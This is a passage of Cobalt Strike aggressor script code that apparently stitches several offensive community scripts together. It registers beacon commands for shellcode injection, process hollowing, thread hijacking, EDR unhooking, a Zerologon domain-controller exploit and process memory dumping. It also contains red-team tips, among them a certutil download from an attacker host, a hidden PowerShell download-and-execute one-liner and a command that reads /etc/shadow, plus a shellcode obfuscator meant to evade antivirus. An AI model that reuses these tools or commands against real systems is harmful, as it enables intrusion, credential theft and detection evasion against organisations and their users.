		blog2($1, "\t\cBcat /etc/passwd | awk -F : '{if (\$3 > 999 && \$3 < 60001) print \$1,\$3,\$6}'");
		blog2($1, "\t\cBcat /etc/motd");
		blog2($1, "\t\cBcat /etc/group");
		blog2($1, "\t\cBcat /etc/shadow\n");


	}

	if ($2 ismatch 'Tips') {

		blog($1, "\t\c4====== Red Team Tips ======\n");
		#Red Tips
		blog2($1, "\t\cBhttps://github.com/vysec/RedTips (If you have InterWebs)");
		blog2($1, "\t\cBhttps://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt (InterWebs Required)");
		blog2($1, "\t\cBNeed a map of the network? Run Bloodhound!! https://github.com/BloodHoundAD/BloodHound");
		blog2($1, "\t\cBAlways check sysvols!! Domain Controllers will have them, you'll be surprised how some are still viewable by normal users.");
		blog2($1, "\t\cBnet user a specific user and see if they are executing any logon scripts, those might contain juicy information.");
		blog2($1, "\t\cBAlways check Desktops/Documents/Downloads/Favorites folders for trails of valuable information left behind.");
		blog2($1, "\t\cBFind those Fileservers! Sysadmins leave behind all kinds of goodies there.");
		blog2($1, "\t\cBUse a Windows 7 workstation to tunnel your traffic natively. netsh int portproxy v4tov4 listenport=[port] connecthost=[AttackerIP] connectport=[port]");
		blog2($1, "\t\cBUse certutil.exe -urlcache -split -f [http://AttackerIP/RemoteFile] to download a file to the target machine.");
		blog2($1, "\t\cBThe all powerful one-liner powershell.exe -w hidden -nop -ep bypass -c \"IEX ((new-object net.webclient).downloadstring('http://[domainname|IP]:[port]/[file]'))\"");
		blog2($1, "\t\cBUse tasklist /S [RemoteComputer] /SVC to see if you have access to that remote machine.");
		blog2($1, "\t\cBEnable RDP through the registry: reg add “HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f");
		blog2($1, "\t\cBPlease wrap/encode/pack your payloads if you have to drop to disk!");
		blog2($1, "\t\cBTry to stay in memory and avoid putting files on disk.");
		blog2($1, "\t\cBLive off the land!! Use what is on the target, native windows binaries are very powerful!");
		blog2($1, "\t\cBUse AD naming schemes to your advantage, sysadmins are lazy and use organization to help them with all the IT work they do on a daily basis.");
		blog2($1, "\t\cBEnterprise Admins will almost always have the rights to move laterally to those foreign domain controllers, 9 times out of 10 they use the same password!");
		blog2($1, "\t\cBInvoke-NinjaCopy.ps1 is super powerful and should be used to grab the ntds.dit and SYSTEM files for offline cracking.");
		blog2($1, "\t\cBHave multiple points of presence on a network for longer engagements. Persistence can go a long way for Security Operations.");
		blog2($1, "\t\cBcmd.exe and powershell.exe blocked by GPO? Find a process that's user owned and started on bootup for process injection to bypass that.");
		blog2($1, "\t\cBJust because you acquired initial access doesn't mean you stop doing recon. Network/Host Enumeration is always the most important part.");
		blog2($1, "\t\cBInvoke-ReverseDnsLookup.ps1 of powersploit finds those machines on the network that has DNS records and can provide more SA for an attacker.");
		blog2($1, "\t\cBNeed a Temporary web server? Use Python! python -m SimpleHTTPServer [port]\n");

	}

	if ($2 ismatch 'Smile') {
		local('$smile');
		$smile = "\n";
		$smile .= "\t\c9░░░░░░░░░░░███████░░░░░░░░░░░\n";
		$smile .= "\t\c9░░░░░░░████░░░░░░░████░░░░░░░\n";
		$smile .= "\t\c9░░░░░██░░░░░░░░░░░░░░░██░░░░░\n";
		$smile .= "\t\c9░░░██░░░░░░░░░░░░░░░░░░░██░░░\n";
		$smile .= "\t\c9░░█░░░░░░░░░░░░░░░░░░░░░░░█░░\n";
		$smile .= "\t\c9░█░░████░░░░░░░░██████░░░░░█░\n";
		$smile .= "\t\c9█░░█░░░██░░░░░░█░░░░███░░░░░█\n";
		$smile .= "\t\c9█░█░░░░░░█░░░░░█░░░░░░░█░░░░█\n";
		$smile .= "\t\c9█░█████████░░░░█████████░░░░█\n";
		$smile .= "\t\c9█░░░░░░░░░░░░░░░░░░░░░░░░░░░█\n";
		$smile .= "\t\c9█░░░░░░░░░░░░░░░░░░░░░░░░░░░█\n";
		$smile .= "\t\c9█░░░████████████████████░░░░█\n";
		$smile .= "\t\c9░█░░░█▓▓▓▓▓▓▓▓█████▓▓▓█░░░░█░\n";
		$smile .= "\t\c9░█░░░░█▓▓▓▓▓██░░░░██▓██░░░░█░\n";
		$smile .= "\t\c9░░█░░░░██▓▓█░░░░░░░▒██░░░░█░░\n";
		$smile .= "\t\c9░░░██░░░░██░░░░░░▒██░░░░██░░░\n";
		$smile .= "\t\c9░░░░░██░░░░███████░░░░██░░░░░\n";
		$smile .= "\t\c9░░░░░░░███░░░░░░░░░███░░░░░░░\n";
		$smile .= "\t\c9░░░░░░░░░░█████████░░░░░░░░░░\n";
		blog($1, $smile);
	}

	if ($2 is $null) {
		berror($1, "\c4Need to specify additional syntax! Use the 'List' command for help");
		blog($1, "\cBSyntax Example: info_RTFM Windows");
	}

}


beacon_command_register(
    "process-hollowing", 
    "EarlyBird process hollowing technique - Spawns a process in a suspended state, injects shellcode, hijack main thread with APC, and execute shellcode", 
    "Synopsis: hollow /path/to/hollow/pe /local/path/to/shellcode.bin"
);

alias process-hollowing {
    if(size(@_) != 3)
    {
        berror($1, "Incorrect usage!");
        berror($1, beacon_command_detail("process-hollowing"));
        return;
    }
    local('$handle $data $args');
    $handle = openf(script_resource("hollow.x64.o"));
    $data = readb($handle, -1);
    closef($handle);

    $sc_handle = openf($3);
	$sc_data = readb($sc_handle, -1);
	closef($sc_handle);

    $args = bof_pack($1,"zb",$2,$sc_data);
    btask($1, "Reading shellcode from: $+  $3");
    
    beacon_inline_execute($1, $data, "go", $args);

}





alias info {
	blog($1, 
       "     info_Advanced	*warning* no sleep written in
	info_Powerpick	
	info_Powershell
	info_XP		*WARNING* no sleep wirtten in (will work on other WIN OS's aswell
	info_WMIC
")
}

on beacon_initial {
	bpowerpick($1, "ipconfig /all ; sleep 120 ; whoami /groups ; sleep 120 ; net groups \"domain admins\" /domain ; sleep 120 ; netstat -napo tcp");
	bps($1);
	blog($1, "shell net user \"poopface.loser\" /domain");
}

alias info_Advanced {
        bshell($1, "wmic qfe list");
        bshell($1, "wmic os getosarchitecture ");
        bshell($1, "netstat -napo tcp");
        bshell($1, 'net group "domain admins" /domain');
        bnet($1, "view");
}

alias info_Powerpick {
        bpowerpick($1, "ipconfig /all ; sleep 120 ; whoami /groups ; sleep 120 ; net groups \"domain admins\" /domain ; sleep 120 ; netstat -napo tcp");
        bps($1);
        blog($1, "shell net user \"poopface.loser\" /domain");
}

alias info_Powershell {
        bpowershell($1, "ipconfig /all ; sleep 120 ; whoami /groups ; sleep 120 ; net groups \"domain admins\" /domain ; sleep 120 ; netstat -napo tcp");
        bps($1);
        blog($1, "shell net user \"poopface.loser\" /domain");
}


alias info_XP {
        bshell($1, "ipconfig /all");
        bshell($1, "whoami /groups");
        bps($1);
        bshell($1, "net groups \"domain admins\" /domain");
        bshell($1, "netstat -napo tcp");
        blog($1, "shell net user \"poopface.loser\" /domain");
}

alias info_WMIC {
        bshell($1, "wmic nicconfig where \"IPEnabled = True\" get IPAddress")
        bshell($1, "wmic nicconfig where \"IPEnabled = True\" get DefaultIPGateway /value")
        bshell($1, "wmic nicconfig where \"IPEnabled = True\" get IPSubnet")
        bshell($1, "wmic nicconfig where \"IPEnabled = True\" get DNSHostname")
        bshell($1, "wmic nicconfig where \"IPEnabled = True\" get DNSDomainSuffixSearchOrder")
        bshell($1, "wmic nicconfig where \"IPEnabled = True\" get DNSServerSearchOrder")
        bshell($1, "netstat -napo tcp")
        bshell($1, "wmic process list brief")
        bshell($1, "wmic computersystem get username")
        bshell($1, "net groups \"domain admins\" /domain")
        blog($1, "net users \"poopface.loser\" /domain")
}




alias zerologon {
	local('$bid $barch $fqdn $netbios $args $safew');
	($bid, $safew, $fqdn) = @_;
	$netbios = split("\\.", $fqdn)[0];

	# figure out the arch of this session
	$barch   = barch($1);
	
	# read in the right BOF file
	$handle = openf(script_resource("zerologon. $+ $barch $+ .o"));
	$data   = readb($handle, -1);
	closef($handle);

	# build our arguments
	$args    = bof_pack($1, "ZZZ", $fqdn, $netbios, $netbios . '$');

	# safety check.
	if ($safew ne "iunderstand") {
		berror($1, "zerologon aborted! Type help zerologon and read first.");
		return;
	}

	# announce what we're doing
	btask($1, "Reset $netbios $+ \$ machine account via CVE-2020-1472");

	# execute it.
	beacon_inline_execute($1, $data, "go", $args);
}

beacon_command_register(
"zerologon", 
"Reset DC machine account password with CVE-2020-1472", 
"Synopsis: zerologon [safeword] [DC.fqdn]\n\nReset the machine account password for a domain controller with the\nZerologon exploit. \n\nThis exploit will break the functionality of this domain controller.\n\c4Don't use in production.\o Use \c0iunderstand\o as the safe word parameter\nto acknowledge that you read this.");


alias unhook {
	local('$barch $handle $data $stomp $args');

	# figure out the arch of this session
	$barch  = barch($1);

	# if we're module stomping; don't run the unhook as-is because we'll walk over
	# everything. We don't want that. A nice improvement would ask unhooker to skip stomped module.
	$stomp = [data_query("metadata")["c2profile"] getString: ".stage.module_ $+ $barch"];

	# read in the right BOF file
	$handle = openf(script_resource("unhook. $+ $barch $+ .o"));
	$data   = readb($handle, -1);
	closef($handle);

	# pack the arguments
	$args = bof_pack($1, "z", $stomp);

	btask($1, "Running unhook");

	# run it.. 
	beacon_inline_execute($1, $data, "go", $args);
}

beacon_command_register(
	"unhook", 
	"remove hooks from DLLs in this process", 
	"Synopsis: unhook\n\nAttempt to remove hooks.");


# $1 - beacon id
alias demo {
	local('$barch $handle $data $args');
	
	# figure out the arch of this session
	$barch  = barch($1);
	
	# read in the right BOF file
	$handle = openf(script_resource("demo. $+ $barch $+ .o"));
	$data   = readb($handle, -1);
	closef($handle);
	
	# pack our arguments
	$args   = bof_pack($1, "zi", "Hello beacon", 1234);
	
	# announce what we're doing
	btask($1, "Running demo BOF");
	
	# execute it.
	beacon_inline_execute($1, $data, "go", $args);
}

alias hello {
   local('$barch $handle $data $args');
   
   # figure out the arch of this session
   $barch  = barch($1);
   
   # read in the right BOF file
   $handle = openf(script_resource("hello. $+ $barch $+ .o"));
   $data   = readb($handle, -1);
   closef($handle);
   
   # pack our arguments
   $args   = bof_pack($1, "zi", "Hello World", 1234);
   
   # announce what we're doing
   btask($1, "Running Hello BOF");
   
   # execute it.
   beacon_inline_execute($1, $data, "demo", $args);
}


# Example BOF test runner script to test the internal beacon BOF functions
# The alias run_boff_tests will run all of the defined tests
#
# Usage: run_boff_tests <user_defined_string>  <user_defined_numeric>
#
# Example:
#    run_boff_tests "my user test string" 2022
#

# Helper function to execute a single test BOF
# $1 - beacon id
# $2 - base name of BOF to run
# $3 - args to pass to BOF
sub bof_test_runner {
   local('$barch $handle $data');
   
   # figure out the arch of this session
   $barch  = barch($1);
   
   # read the contents of the BOF
   $handle = openf(script_resource("obj/ $+ $2 $+ . $+ $barch $+ .o"));
   $data   = readb($handle, -1);
   closef($handle);
   
   # announce what we're doing to the beacon and script consoles
   btask($1, "Running example BOF: $2");
   println(formatDate("[HH:mm:ss] ") . "Running example BOF: $2");
   
   # execute the BOF.
   beacon_inline_execute($1, $data, "go", $3);
}

# Test runner alias to execute the defined tests
# $1 - beacon id
# $2 - User test string to pass to the bof file
# $3 - User test number to pass to the bof file
# $4 - User test number as a string to pass to the bof file (only testBeaconDataLongLong)
alias run_boff_tests {
   local('@tests @test');
   
   # Define the tests to run
   @tests = @(
      @("testBeaconDataStrings",      bof_pack($1, "zzz", $2, "Test Defined String", "Next Test Defined String")),
      @("testBeaconDataShorts",       bof_pack($1, "ssssss", $3, $3, -32768, 32767, 0, 65535)),
      @("testBeaconDataIntegers",     bof_pack($1, "iiiiii", $3, $3, -2147483648, 2147483647, 0, -1)),
      @("testBeaconDataMixDataTypes", bof_pack($1, "zis", $2, $3, $3)),
      @("testBeaconDataLongLong",     bof_pack($1, "zi", $4, $3)),
      @("testBeaconOutput",           bof_pack($1, "zi", $2, $3)),
      @("testBeaconPrintf",           bof_pack($1, "zi", $2, $3)),
      @("testBeaconFormat",           bof_pack($1, "zi", $2, $3)),
      @("testBeaconErrorD",           $null),
      @("testBeaconErrorDD",          $null),
      @("testBeaconErrorNA",          $null)
   );

   foreach @test (@tests)
   {
      bof_test_runner($1, @test[0], @test[1]);
   }
}



beacon_command_register(
"syscalls_shinject", 
"Use syscalls from on-disk dll to execute custom shellcode launch with Nt functions.", 
"Synopsis: syscalls_shinject PID path_to_bin");

beacon_command_register(
"syscalls_inject", 
"Use syscalls from on-disk dll to execute CRT beacon shellcode launch with Nt functions.", 
"Synopsis: syscalls_inject PID listener_name");

alias syscalls_shinject {
	local('$handle $data $args $sc_data');
	
	# figure out the arch of this session
	$barch  = barch($1);
	
	# read in the right BOF file
	$handle = openf(script_resource("syscallsinject. $+ $barch $+ .o"));
	$data = readb($handle, -1);
	closef($handle);

	$sc_handle = openf($3);
	$sc_data = readb($sc_handle, -1);
	closef($sc_handle);

	# pack our arguments
	$args = bof_pack($1, "ib", $2, $sc_data);
	
	btask($1, "Syscalls Shellcode Injection BOF (@ajpc500)");
	btask($1, "Reading shellcode from: $+  $3");

	# execute it.
	beacon_inline_execute($1, $data, "go", $args);
}

alias syscalls_inject {
	local('$handle $data $args');
	
	# figure out the arch of this session
	$barch  = barch($1);
	

	# read in the right BOF file
	$handle = openf(script_resource("syscallsinject. $+ $barch $+ .o"));
	$data = readb($handle, -1);
	closef($handle);

	if (listener_info($3) is $null) {
		berror($1, "Could not find listener $3");
	}
	else {
		# Exit function is thread, as we're injecting into an existing process we likely don't wanna terminate on beacon exit.
		$sc_data = payload($3, "x64", "thread");

		# pack our arguments
		$args = bof_pack($1, "ib", $2, $sc_data);

		btask($1, "Syscalls Shellcode Injection BOF (@ajpc500)");
		btask($1, "Using $+  $3  $+ listener for beacon shellcode generation.");

		# execute it.
		beacon_inline_execute($1, $data, "go", $args);
	}
}

beacon_command_register(
"static_syscalls_shinject", 
"Use static syscalls to execute custom shellcode launch with Nt functions.", 
"Synopsis: static_syscalls_shinject PID path_to_bin");

beacon_command_register(
"static_syscalls_inject", 
"Use static syscalls to execute CRT beacon shellcode launch with Nt functions.", 
"Synopsis: static_syscalls_inject PID listener_name");

alias static_syscalls_shinject {
	local('$handle $data $args $sc_data');
	
	# figure out the arch of this session
	$barch  = barch($1);
	
	# read in the right BOF file
	$handle = openf(script_resource("syscallsinject. $+ $barch $+ .o"));
	$data = readb($handle, -1);
	closef($handle);

	$sc_handle = openf($3);
	$sc_data = readb($sc_handle, -1);
	closef($sc_handle);

	# pack our arguments
	$args = bof_pack($1, "ib", $2, $sc_data);
	
	btask($1, "Static Syscalls Shellcode Injection BOF (@ajpc500)");
	btask($1, "Reading shellcode from: $+  $3");

	# execute it.
	beacon_inline_execute($1, $data, "go", $args);
}

alias static_syscalls_inject {
	local('$handle $data $args');
	
	# figure out the arch of this session
	$barch  = barch($1);
	

	# read in the right BOF file
	$handle = openf(script_resource("syscallsinject. $+ $barch $+ .o"));
	$data = readb($handle, -1);
	closef($handle);

	if (listener_info($3) is $null) {
		berror($1, "Could not find listener $3");
	}
	else {
		# Exit function is thread, as we're injecting into an existing process we likely don't wanna terminate on beacon exit.
		$sc_data = payload($3, "x64", "thread");

		# pack our arguments
		$args = bof_pack($1, "ib", $2, $sc_data);

		btask($1, "Static Syscalls Shellcode Injection BOF (@ajpc500)");
		btask($1, "Using $+  $3  $+ listener for beacon shellcode generation.");

		# execute it.
		beacon_inline_execute($1, $data, "go", $args);
	}
}


beacon_command_register(
"static_syscalls_dump", 
"Use static syscalls to dump a given PID and save to disk", 
"Synopsis: static_syscalls_dump PID output_file");

beacon_command_register(
"static_syscalls_dump", 
"Use static syscalls to dump a given PID and save to disk", 
"Synopsis: static_syscalls_dump PID output_file");

alias static_syscalls_dump {
	local('$handle $data $args $pid $output_file');
	
	# figure out the arch of this session
	$barch  = barch($1);
	
	# read in the right BOF file
	$handle = openf(script_resource("syscallsdump. $+ $barch $+ .o"));
	$data = readb($handle, -1);
	closef($handle);

	if(size(@_) < 2)
	{
		berror($1, "Incorrect usage!");
		berror($1, beacon_command_detail("static_syscalls_dump"));
		return;
	}

	$output_file = iff(-istrue $3, $3, "C:\\Windows\\Temp\\PID- $+ $2 $+ .dmp");

	# pack our arguments
	$args = bof_pack($1, "iz", $2, $output_file);
	
	btask($1, "Syscalls Process Dump BOF (@ajpc500)");
	
	# execute it.
	beacon_inline_execute($1, $data, "go", $args);
}


beacon_command_register(
"static_syscalls_apc_shspawn", 
"Spawn process and use syscalls to execute custom shellcode launch with Nt functions (NtMapViewOfSection -> NtQueueUserApc).", 
"Synopsis: static_syscalls_apc_shspawn path_to_bin");

beacon_command_register(
"static_syscalls_apc_spawn", 
"Spawn process and use syscalls to execute beacon shellcode launch with Nt functions (NtMapViewOfSection -> NtQueueUserApc).", 
"Synopsis: static_syscalls_apc_spawn listener_name");

alias static_syscalls_apc_shspawn {
	local('$handle $data $args $sc_data');
	
	# figure out the arch of this session
	$barch  = barch($1);
	
	# read in the right BOF file
	$handle = openf(script_resource("syscallsapcspawn. $+ $barch $+ .o"));
	$data = readb($handle, -1);
	closef($handle);

	$sc_handle = openf($2);
	$sc_data = readb($sc_handle, -1);
	closef($sc_handle);

	# pack our arguments
	$args = bof_pack($1, "b", $sc_data);
	
	btask($1, "Syscalls Spawn and Shellcode APC Injection BOF (@ajpc500)");	
	btask($1, "Reading shellcode from: $+  $2");

	# execute it.
	beacon_inline_execute($1, $data, "go", $args);
}

alias static_syscalls_apc_spawn {
	local('$handle $data $args');
	
	# figure out the arch of this session
	$barch  = barch($1);
	

	# read in the right BOF file
	$handle = openf(script_resource("syscallsapcspawn. $+ $barch $+ .o"));
	$data = readb($handle, -1);
	closef($handle);

	if (listener_info($2) is $null) {
		berror($1, "Could not find listener $2");
	}
	else {
		$sc_data = artifact_payload($2, "raw", "x64");

		# pack our arguments
		$args = bof_pack($1, "b", $sc_data);

		btask($1, "Syscalls Spawn and Shellcode APC Injection BOF (@ajpc500)");
		btask($1, "Using $+  $2  $+ listener for beacon shellcode generation.");

		# execute it.
		beacon_inline_execute($1, $data, "go", $args);
	}
}

beacon_command_register(
    "sec-inject", 
    "Injects beacon shellcode into target process using section mapping", 
    "Synopsis: sec-inject PID LISTENER_NAME"
);

beacon_command_register(
    "sec-shinject", 
    "Injects desired shellcode into target process using section mapping", 
    "Synopsis: sec-shinject PID /path/to/bin"
);

alias sec-shinject {
    if(size(@_) != 3)
    {
        berror($1, "Incorrect usage!");
        berror($1, beacon_command_detail("sec-shinject"));
        return;
    }

    local('$barch $handle $data $args');
    
    # Get beacon architecture
    $barch = barch($1);

    # Ensure we are in an x64 beacon
    if ($barch !eq 'x64') {
        berror($1, "We just support x64 at the moment.");
        return;
    }

    # Verify PID is an integer
    # Conditional taken from: https://github.com/connormcgarr/cThreadHijack/blob/main/cThreadHijack.cna
    if ((!-isnumber $2) || (int($2) <= 0))
    {
        berror($1, "Please enter a valid PID");
        return;
    }

    # Load BOF
    $handle = openf(script_resource("secinject. $+ $barch $+ .o"));
    $data = readb($handle, -1);
    closef($handle);


    # Check if supplied file exists
    if (!-exists $3) {
        berror($1, "File doesn't exist");
        return;
    }


    # Read shellcode from bin
    local('$sc_handle $sc_data');
    $sc_handle = openf($3);
    $sc_data = readb($sc_handle, -1);
    closef($sc_handle);

    # Pack args
    $args = bof_pack($1,"ib", $2, $sc_data);
    
    btask($1, "SecInject: Section Mapping Process Injection (@apokryptein | github.com/apokryptein)");
    btask($1, "Injecting shellcode: $+ $3");
    btask($1, "Target Process: $+ $2");

    beacon_inline_execute($1, $data, "go", $args);
}

alias sec-inject {
    if(size(@_) != 3)
    {
        berror($1, "Incorrect usage!");
        berror($1, beacon_command_detail("sec-inject"));
        return;
    }

    local('$barch $handle $data $args');
    
    # Get beacon architecture
    $barch = barch($1);

    # Ensure we are in an x64 beacon
    if ($barch !eq 'x64') {
        berror($1, "We just support x64 at the moment.");
        return;
    }

    # Verify PID is an integer
    # Conditional borrowed from: https://github.com/connormcgarr/cThreadHijack/blob/main/cThreadHijack.cna
    if ((!-isnumber $2) || (int($2) <= 0))
    {
        berror($1, "Please enter a valid PID");
        return;
    }

    # Verify listener exists
    if (($3 !in listeners()) && ($3 !in listeners_local()) && ($3 !in listeners_stageless())) {
        berror($1, "That listener seems invalid.");
        return;
    }

    # Load BOF
    $handle = openf(script_resource("secinject. $+ $barch $+ .o"));
    $data = readb($handle, -1);
    closef($handle);

    # Generate payload based on supplied beacon (currently x64 only)
    local('$payload');
    $payload = payload($3, "x64", "thread");

    # Pack args
    $args = bof_pack($1,"ib", $2, $payload);
    btask($1, "SecInject: Section Mapping Process Injection (@apokryptein | github.com/apokryptein)");
    btask($1, "Injecting beacon into PID: $+ $2");

    beacon_inline_execute($1, $data, "go", $args);
}

# Register help/usage for cThreadHijack
beacon_command_register(
"cThreadHijack",
"cThreadHijack: Remote process injection via thread hijacking",
"\ncThreadHijack: Remote process injection via thread hijacking\n".
"\nUsage: cThreadHijack PID LISTENER_NAME\n".
"\ncThreadHijack works by injecting raw Beacon shellcode, generated via a user-supplied listener argument, into a remote process, defined by the user-supplied PID argument, via VirtualAllocEx and WriteProcessMemory. Then, instead of spawning a new remote thread via CreateRemoteThread or other APIs, cThreadHijack identifies the first enumerated thread in the target process, suspends it, and retrieves the contents of the thread's CPU state via a CONTEXT structure. Then, the RIP register member of the CONTEXT structure (on 64-bit systems) is manipulated to point to the address of the aforementioned remote Beacon shellcode. Prior to execution, a routine is added to wrap the Beacon shellcode inside of a call to CreateThread - giving Beacon its own thread to work in, with this thread being locally spawned, versus being spawned remotely. The CreateThread routine is also wrapped in an NtContinue function call routine, allowing restoration of the previously hijacked thread without crashing the remote process. Beacon payloads for cThreadHijack are generated with a 'thread' exit function, allowing process continuation after the Beacon has been exited. Beacon listener names, when containing a space, must be placed in quotes.\n".
"\nExample usage: cThreadHijack 8897 \"HTTPS Listener\"\n"
);

# Setup cThreadHijack
alias cThreadHijack {

    # Alias for Beacon ID and args
    local('$bid $listener $pid $payload');
    
    # Set the number of arguments
    ($bid, $pid, $listener) = @_;

    # Determine the amount of arguments
    if (size(@_) != 3)
    {
        berror($bid, "Error! Please enter a valid listener and PID");
		return;
    }

    # Read in the BOF
    $handle = openf(script_resource("cThreadHijack.o"));
    $data = readb($handle, -1);
    closef($handle);

    # Verify PID is an integer
    if ((!-isnumber $pid) || (int($pid) <= 0))
    {
        berror($bid, "Please enter a valid PID!\n");
        return;
    }

    # Generate a new payload 
    $payload = payload_local($bid, $listener, "x64", "thread");
    $handle1 = openf(">out.bin");
    writeb($handle1, $data1);
    closef($handle1);
    
    # Pack the arguments
    # 'b' is binary data and 'i' is an integer
    $args = bof_pack($bid, "ib", $pid, $payload);

    # Run the BOF
    # go = Entry point of the BOF
    beacon_inline_execute($bid, $data, "go", $args);
}

#Find process handles en modules

#register help
beacon_command_register("FindProcHandle", "Find specific process handles.",
    	"Synopsis: FindProcHandle lsass.exe\n\n" .
    	"Use Direct System Calls to find processes with specific process handles.\n");

beacon_command_register("FindModule", "Find loaded modules.",
    	"Synopsis: FindModule clr.dll\n\n" .
    	"Use Direct System Calls to find processes with specific modules loaded.\n");

alias FindProcHandle {
	$bid = $1;

  	$input = substr($0, 15);
	@args = split(' ', $input);

	$proc = @args[0];

	if ($proc eq "") {
		berror($bid, "Specify a process handle (e.g. lsass.exe).");
		return;
	}

	# Read in the right BOF file
	$handle = openf(script_resource("FindProcHandle.o"));
	$data   = readb($handle, -1);
	closef($handle);

	# Pack our arguments
	$arg_data   = bof_pack($bid, "Z", $proc);

	beacon_inline_execute($bid, $data, "go", $arg_data);
}

alias FindModule {
    	$bid = $1;

    	$input = substr($0, 11);
	@args = split(' ', $input);

	$mod = @args[0];

	if ($mod eq "") {
		berror($bid, "Specify a module (e.g. clr.dll).");
		return;
	}

	# Read in the right BOF file
	$handle = openf(script_resource("FindModule.o"));
	$data   = readb($handle, -1);
	closef($handle);

	# Pack our arguments
	$arg_data   = bof_pack($bid, "Z", $mod);

    	beacon_inline_execute($bid, $data, "go", $arg_data);
}






# Build directory for shellcode obfuscatior




# ensure this function name is called again at the end of this build script
sub generate_shellcode {
# Generate and cutomize the payload submenu
	$dialog = dialog("Shellcode obfuscatior", %(listener => "Select Listener", xor_key => random_string("1"), aes_key => random_string("32"), line_length => "80"), &shellcode_gen);
	dialog_description($dialog, "Generate beacon stageless shellcode or use external shellcode file. Options applied in descending order.");
	drow_listener_stage($dialog, "listener", "Listener: ");
	drow_combobox($dialog, "payload_type", "Delivery: ", @("Stageless","Staged"));
	drow_combobox($dialog, "exit_method", "Exit Method: ", @("process", "thread"));
	drow_checkbox($dialog, "local", "Local Pointers: ", "Embeded Pointers from an Existing Session");
	drow_beacon($dialog, "bid", "Existing Session: ");
	drow_checkbox($dialog, "x86", "x86: ", "Use x86 Shellcode");
	drow_file($dialog, "scfile", "Or Use Shellcode File: ");
	drow_combobox($dialog, "format", "Formatting: ", @("raw","hex","0x90\,0x90\,0x90","\\x90\\x90\\x90","0x90uy\;0x90uy\;0x90uy","b64"));
	drow_checkbox($dialog, "XOR", "XOR: ", "XOR Encrypt Shellcode");
	drow_text($dialog, "xor_key", "XOR Key\(s\): ");
	drow_checkbox($dialog, "AES", "AES: ", "AES Encrypt Shellcode");
	drow_text($dialog, "aes_key", "AES Key: ");
	drow_combobox($dialog, "encode_compress", "Encoding/Compression: ", @("none","b64","gzip then b64","gzip","b64 then gzip","b64 then 7xgzip"));
	drow_combobox($dialog, "multiline", "Multiline Output: ", @("none","quoted","chunks.push_back"));
	drow_text($dialog, "line_length", "Multiline Length: ");
	dbutton_action($dialog, "Generate");

	dialog_show($dialog);
}

sub shellcode_gen {
	# Uncomment to enable cna script debugging
	#debug(debug() | 64);

	# Assign menu selections to variables used in shellcode build
	$exit_method = $3['exit_method'];
	$xorkey = $3['xor_key'];
	$aeskey = $3['aes_key'];
	$linelength = $3['line_length'];

	# Error if no Listener or file is selected
	if (($3['listener'] ismatch "Select Listener") && ($3['scfile'] ismatch "")) {
		#berror($1, 'You did not select a proper Listener.');
		show_message("Please select a proper Listener or Shellcode file.");
		break;
	}

	else {
		# Set shellcode architecture based on menu checkbox selection
		$arch = "x64";
		if ($3['x86'] eq "true") {
			$arch = "x86";
		}
		
		# Error if Staged delivery type is selected
		if ($3['payload_type'] eq "Staged") {
			berror($1, 'You did not select Stagless Delivery.');
			show_message("Only Stageless Delivery supported for this shellcode obfuscatior.");
			break;
		}

		###### Load or Create Beacon Shellcode Section

		# Create beacon shellcode with local session pointers, listener, architecture, and exit method
		if ($3['local'] eq "true") {
			$shellcode = payload_local($3['bid'], $3['listener'], $arch, $exit_method);
			println("Beacon ID= " . $3['bid']);
			println("Listener= " . $3['listener']);
			println("Architecture= " . $arch);
			println("Exit Method= " . $exit_method);
		}

		# else Create the beacon shellcode with listener, architecture, and exit method
			else {
				$shellcode = payload($3['listener'], $arch, $exit_method);
				println("Listener= " . $3['listener']);
				println("Architecture= " . $arch);
				println("Exit Method= " . $exit_method);
			}

		# Alternate import of shellcode from a file if path is supplied
		if ($3['scfile'] ne ""){
			$shellcode_file = openf($3['scfile']);
			$shellcode = readb($shellcode_file, -1);
			closef($shellcode_file);
		}

		# Get raw shellcode size in bytes
		$sc_size = strlen($shellcode);

		###### Formatting Section

		# RAW/No Formatting
		if ($3['format'] eq "raw") {
			$format_shellcode = $shellcode;
		}

		# hex format
		if ($3['format'] eq "hex") {
			$format_shellcode = transform($shellcode, "hex");
		}
		
		# c# format
		if ($3['format'] eq "0x90\,0x90,\0x90") {
			$format_shellcode = format_csharp($shellcode);
		}

		# f# format
		if ($3['format'] eq "0x90uy\;0x90uy\;0x90uy") {
			$format_shellcode = format_fsharp($shellcode);
		}

		# c/cpp format
		if ($3['format'] eq "\\x90\\x90\\x90") {
			$format_shellcode = format_cpp($shellcode);
		}

		# early b64 encoding option
		if ($3['format'] eq "b64") {
			$format_shellcode = base64_encode($shellcode);
		}

		###### Encryption Section

		# Error if multiple encryption types are selected
		if ($3['XOR'] eq "true" && $3['AES'] eq "true") {
			show_message("Cannot select both encryption types, try again");
			break;
		}
		
		# No Encryption
		if ($3['XOR'] eq "false" && $3['AES'] eq "false") {
			$encrypted_shellcode = $format_shellcode
		}
		
		# XOR Encryption
		if ($3['XOR'] eq "true") {
			$encrypted_shellcode = str_xor($format_shellcode, $xorkey);
			# Save XOR key to a file
			$xorkey_resource = openf(">".script_resource($XORKEY)."");
			writeb($xorkey_resource, $xorkey);
			closef($xorkey_resource);
			# Show XOR key in popup message and script console
			println("XOR Key: " . $xorkey . "");
			show_message("XOR key used is: $xorkey");
		}
		
		# AES Encryption
		if ($3['AES'] eq "true") {
			# Write $format_shellcode to a file for encryption
			$formatted_resource = openf(">".script_resource($FORMATTED)."");
			writeb($formatted_resource, $format_shellcode);
			closef($formatted_resource);
			# Save AES key to a file
			$key_resource = openf(">".script_resource($AESKEY)."");
			writeb($key_resource, $aeskey);
			closef($key_resource);
			# Use AES python script to encrypt the formatted shellcode file
			$aes_python = script_resource(($AESPYTHON)."");
			$in_file = script_resource(($FORMATTED)."");
			$out_file = script_resource(($ENCRYPTED)."");
			exec("python ". $aes_python ." encrypt $aeskey $in_file $out_file");
			# Set $encrypted_shellcode value from the encrypted file
			sleep(3 * 1000);
			$encrypted_resource = openf(script_resource($ENCRYPTED)."");
			$encrypted_shellcode = readb($encrypted_resource, -1);
			closef($encrypted_resource);
			# Show AES key in popup message and script console
			println("AES Key: " . $aeskey . "");
			show_message("AES key used is: $aeskey");
		}

		# position-independent blob of xor shellcode with an embeded decoder
		# DID NOT USE, xor decoder flagged by AV
		#$encoded_shellcode = encode($format_shellcode, "xor", $arch);
		
